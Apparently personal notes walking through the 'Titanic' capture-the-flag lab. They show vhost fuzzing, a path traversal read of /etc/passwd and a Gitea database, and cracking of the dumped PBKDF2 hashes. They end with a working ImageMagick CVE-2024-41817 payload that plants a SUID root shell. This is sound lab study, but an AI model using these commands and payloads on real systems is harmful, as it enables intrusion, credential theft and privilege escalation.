@@ -1,0 +1,292 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.55/ -H "Host: FUZZ.titanic.htb" --hc 404,301
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.55/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000019:   200        275 L    1278 W     13871 Ch    "dev"   
+
+
+
+gitea running on dev
+we are allowed to register
+
+we find this
+
+version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets 
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+
+
+
+also
+
+@app.route('/download', methods=['GET'])
+def download_ticket():
+    ticket = request.args.get('ticket')
+    if not ticket:
+        return jsonify({"error": "Ticket parameter is required"}), 400
+
+    json_filepath = os.path.join(TICKETS_DIR, ticket)
+
+    if os.path.exists(json_filepath):
+        return send_file(json_filepath, as_attachment=True, download_name=ticket)
+    else:
+        return jsonify({"error": "Ticket not found"}), 404
+
+
+path traversal vulnerability in the /download route. 
+The ticket parameter is used directly in os.path.join(TICKETS_DIR, ticket) without validation. 
+An attacker can supply ../ sequences to access files outside the tickets directory, e.g.:
+
+GET /download?ticket=/etc/passwd HTTP/1.1
+we find developer is the only user on the system
+
+additionally...
+
+version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+
+
+"We now know a potentially interesting folder location, which appears as a volume mount in the Docker
+configuration and could contain the Gitea installation data folder. The data folder typically contains
+various Gitea configuration files and also the SQLITE database that is used by default by Gitea to store
+usernames, passwords and other valuable information. If we manage to access it we might get access to
+encrypted user passwords. The database file is typically named gitea.db , however, attempting to access
+/home/developer/gitea/data/gitea.db does not seem to work."
+
+
+instead we find it at gitea/data/gitea/gitea.db
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wget -O gitea.db "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db"
+--2025-12-01 21:08:40--  http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
+Resolving titanic.htb (titanic.htb)... 10.10.11.55
+Connecting to titanic.htb (titanic.htb)|10.10.11.55|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2084864 (2.0M) [application/octet-stream]
+Saving to: ‘gitea.db’
+
+gitea.db                      100%[==============================================>]   1.99M  3.65MB/s    in 0.5s    
+
+2025-12-01 21:08:41 (3.65 MB/s) - ‘gitea.db’ saved [2084864/2084864]
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# sqlite3 gitea.db                                                                               
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+access                     oauth2_grant             
+access_token               org_user                 
+action                     package                  
+action_artifact            package_blob             
+action_run                 package_blob_upload      
+action_run_index           package_cleanup_rule     
+action_run_job             package_file             
+action_runner              package_property         
+action_runner_token        package_version          
+action_schedule            project                  
+action_schedule_spec       project_board            
+action_task                project_issue            
+action_task_output         protected_branch         
+action_task_step           protected_tag            
+action_tasks_version       public_key               
+action_variable            pull_auto_merge          
+app_state                  pull_request             
+attachment                 push_mirror              
+auth_token                 reaction                 
+badge                      release                  
+branch                     renamed_branch           
+collaboration              repo_archiver            
+comment                    repo_indexer_status      
+commit_status              repo_redirect            
+commit_status_index        repo_topic               
+commit_status_summary      repo_transfer            
+dbfs_data                  repo_unit                
+dbfs_meta                  repository               
+deploy_key                 review                   
+email_address              review_state             
+email_hash                 secret                   
+external_login_user        session                  
+follow                     star                     
+gpg_key                    stopwatch                
+gpg_key_import             system_setting           
+hook_task                  task                     
+issue                      team                     
+issue_assignees            team_invite              
+issue_content_history      team_repo                
+issue_dependency           team_unit                
+issue_index                team_user                
+issue_label                topic                    
+issue_user                 tracked_time             
+issue_watch                two_factor               
+label                      upload                   
+language_stat              user                     
+lfs_lock                   user_badge               
+lfs_meta_object            user_blocking            
+login_source               user_open_id             
+milestone                  user_redirect            
+mirror                     user_setting             
+notice                     version                  
+notification               watch                    
+oauth2_application         webauthn_credential      
+oauth2_authorization_code  webhook                  
+sqlite> select * from user;
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
+3|tony|tony||tony@soprano.com|0|enabled|c3d7282e4811b81f86cd0da54091db8032c2c82ed1b41b2d758bc9f65be413fd411f8f2d92345ad9f280a34e40471f3d05a2|pbkdf2$50000$50|0|0|0||0|||25e660c85efd28908ba8e2c15d22cd3f|8ab8a5e636afa4ee60c67f623e74aa32|en-US||1764581304|1764640416|1764640416|0|-1|1|0|0|0|0|1|0|ba34b08ab91aa96e1bedee4002efeb9c|tony@soprano.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
+sqlite> 
+
+sqlite> .headers on
+sqlite> .mode column
+sqlite> select * from user;
+id  lower_name     name           full_name  email                  keep_email_private  email_notifications_preference  passwd                                                        passwd_hash_algo  must_change_password  login_type  login_source  login_name  type  location  website  rands                             salt                              language  description  created_unix  updated_unix  last_login_unix  last_repo_visibility  max_repo_creation  is_active  is_admin  is_restricted  allow_git_hook  allow_import_local  allow_create_organization  prohibit_login  avatar                            avatar_email           use_custom_avatar  num_followers  num_following  num_stars  num_repos  num_teams  num_members  visibility  repo_admin_change_team_access  diff_view_style  theme       keep_activity_private
+--  -------------  -------------  ---------  ---------------------  ------------------  ------------------------------  ------------------------------------------------------------  ----------------  --------------------  ----------  ------------  ----------  ----  --------  -------  --------------------------------  --------------------------------  --------  -----------  ------------  ------------  ---------------  --------------------  -----------------  ---------  --------  -------------  --------------  ------------------  -------------------------  --------------  --------------------------------  ---------------------  -----------------  -------------  -------------  ---------  ---------  ---------  -----------  ----------  -----------------------------  ---------------  ----------  ---------------------
+1   administrator  administrator             root@titanic.htb       0                   enabled                         cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d4  pbkdf2$50000$50   0                     0           0                         0                        70a5bd0c1a5d23caa49030172cdcabdc  2d149e5fbd1b20cf31db3e3c6a28fc9b  en-US                  1722595379    1722597477    1722597477       0                     -1                 1          1         0              0               0                   1                          0               2e1e70639ac6b0eecbdab4a3d19e0f44  root@titanic.htb       0                  0              0              0          0          0          0            0           0                                               gitea-auto  0                    
+                                                                                                                        59c08d2dfc063b2406ac9207c980c47c5d017136                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+2   developer      developer                 developer@titanic.htb  0                   enabled                         e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b  pbkdf2$50000$50   0                     0           0                         0                        0ce6f07fc9b557bc070fa7bef76a0d15  8bf3e3452b78544f8bee9400d6936d34  en-US                  1722595646    1722603397    1722603397       0                     -1                 1          0         0              0               0                   1                          0               e2d95b7e207e432f62f3508be406c11b  developer@titanic.htb  0                  0              0              0          2          0          0            0           0                                               gitea-auto  0                    
+                                                                                                                        7cbc8efc5dbef30bf1682619263444ea594cfb56                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+3   tony           tony                      tony@soprano.com       0                   enabled                         c3d7282e4811b81f86cd0da54091db8032c2c82ed1b41b2d758bc9f65be4  pbkdf2$50000$50   0                     0           0                         0                        25e660c85efd28908ba8e2c15d22cd3f  8ab8a5e636afa4ee60c67f623e74aa32  en-US                  1764581304    1764640416    1764640416       0                     -1                 1          0         0              0               0                   1                          0               ba34b08ab91aa96e1bedee4002efeb9c  tony@soprano.com       0                  0              0              0          0          0          0            0           0                                               gitea-auto  0                    
+                                                                                                                        13fd411f8f2d92345ad9f280a34e40471f3d05a2                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+
+
+Gitea uses PBKDF2 for password hashing, but the actual password hash is stored in the passwd column, and the hash algorithm info is in the passwd_hash_algo column (for developer: pbkdf2$50000$50). The value in passwd is the raw hash, not a standard format hashid recognizes.
+
+the salt and hash are stored as hex strings
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 8bf3e3452b78544f8bee9400d6936d34 | xxd -r -p | base64
+echo e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 | xxd -r -p | base64
+i/PjRSt4VE+L7pQA1pNtNA==
+5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+                                                                                                                     
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y='>hash               
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hashcat -m 10900 -a 0 hash /usr/share/wordlists/rockyou.txt
+
+
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+
+25282528 is the password
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh developer@titanic.htb      
+...
+developer@titanic:~$ 
+
+
+developer@titanic:/opt$ cd scripts
+developer@titanic:/opt/scripts$ ls -lsa
+total 12
+4 drwxr-xr-x 2 root root 4096 Feb  7  2025 .
+4 drwxr-xr-x 5 root root 4096 Feb  7  2025 ..
+4 -rwxr-xr-x 1 root root  167 Feb  3  2025 identify_images.sh
+developer@titanic:/opt/scripts$ cat identify_images.sh 
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+developer@titanic:/opt/scripts$ 
+
+identify_images.sh is owned by root, is world-executable
+
+
+
+developer@titanic:/opt/scripts$ magick --version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (9.4)
+developer@titanic:/opt/scripts$ 
+
+
+"This script seems to be emptying the contents of metadata.log in the /opt/app/static/assets/images
+folder, using the find command to find jpg images in this folder and then passing those to the magick
+command with the identify operator. The output of magick is passed back to metadata.log .
+At this moment we aren't sure if this script is being executed, however, enumeration of the
+/opt/app/static/assets/images shows that the metadata.log file is modified every minute, which
+indicates that the script is indeed running periodically."
+
+
+"The version is revealed to be 7.1.1-35 . A quick Google search with the keywords magick exploit poc
+reveals this advisory, which details an Arbitrary Code Execution vulnerability in the same version of magick
+and is assigned CVE-2024-41817.
+In order to exploit this vulnerability let's use the following command, which parses C code and compiles it
+with gcc into a shared library object called libxcb.so.1"
+
+https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
+
+
+developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void init(){
+system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
+exit(0);
+}
+EOF
+
+
+"The payload will copy the /bin/sh binary into /tmp and give it SUID permissions."
+
+
+developer@titanic:/tmp$ ./sh -p
+# id
+uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
+# 
+
+
+
+
+
+
+
+
+
